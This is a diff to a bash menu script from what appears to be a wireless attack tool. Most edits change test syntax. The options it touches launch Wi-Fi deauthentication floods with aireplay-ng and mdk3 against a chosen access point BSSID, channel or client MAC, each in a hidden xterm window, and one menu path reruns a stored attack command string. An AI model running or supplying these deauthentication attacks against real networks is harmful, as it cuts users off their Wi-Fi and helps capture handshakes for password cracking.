@@ -173,7 +173,7 @@ do
 	fi
 	echo -e ""$YS" 0"$CE") EXIT"
 	read DT
-	if [ $DT = 1 ]
+	if [[ $DT = 1 ]]
 	then
 		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
 		read -e DEAUTHS
@@ -185,28 +185,29 @@ do
 		export DEAUTHS
 		export TARGB
 		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $WLANNM && exit; exec bash'
-	elif [ $DT = "" ]
+	elif [[ $DT == "" ]]
 	then
 		if [[ HANDFORDEAUTH != "" ]]
 		then
 			if [[ LASTOPTIONS != "" ]]
 			then
-				if [[ LASTOPTIONS = 1 ]]
+				if [ LASTOPTIONS = 1 ]
 				then
 					option4
 				else
-					$LASTOPTIONS
+					xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash"
 				fi
 			fi
 		fi
-	elif [ $DT = 2 ]
+	sleep 2
+	elif [[ $DT = 2 ]]
 	then
 		echo "$TARGB" > /root/mdk3bssid.txt
 		LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
 		export DEAUTHS
 		export TARGB
 		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
-	elif [ $DT = 3 ]
+	elif [[ $DT = 3 ]]
 	then
 		echo -e "Client's MAC: "
 		read -e TCC
@@ -222,7 +223,7 @@ do
 		export TARGB
 		export TCC
 		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
-	elif [ $DT = 4 ]
+	elif [[ $DT = 4 ]]
 	then
 		LASTOPTIONS=1
 		#~ # MAKE THIS OPTION AVAILABLE ONLY IF A FILE IS CREATED
@@ -256,7 +257,7 @@ do
 		#~ done
 		#~ ---------------------
 		option4
-	elif [ $DT = 0 ]
+	elif [[ $DT = 0 ]]
 	then
 		exit
 	fi
